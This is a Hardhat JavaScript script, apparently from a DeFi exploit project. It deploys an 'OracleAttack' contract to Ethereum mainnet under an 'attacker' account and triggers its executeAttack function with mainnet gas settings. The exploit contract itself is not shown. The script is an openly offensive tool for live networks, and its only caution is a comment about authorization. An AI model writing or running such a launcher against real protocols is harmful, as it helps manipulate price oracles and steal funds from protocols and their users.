// scripts/oracle_attack.js

require("dotenv").config();
const { ethers } = require("hardhat");

async function main() {
  const [attacker] = await ethers.getSigners();
  console.log("🚀 Attacker address:", attacker.address);

  // Load contract ABI + Bytecode (already compiled)
  const OracleAttack = await ethers.getContractFactory("OracleAttack");

  // Deploy to mainnet — CAUTION: use only after authorization
  const oracleAttack = await OracleAttack.deploy();
  await oracleAttack.deployed();
  console.log("📡 OracleAttack contract deployed at:", oracleAttack.address);

  // Example attack execution
  const tx = await oracleAttack.executeAttack({
    gasLimit: 5000000, // adjust depending on complexity
    gasPrice: ethers.utils.parseUnits("10", "gwei"), // mainnet-safe gas price
  });
  console.log("💣 Attack transaction sent:", tx.hash);

  const receipt = await tx.wait();
  console.log("✅ Attack confirmed in block:", receipt.blockNumber);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("❌ Error in attack script:", error);
    process.exit(1);
  });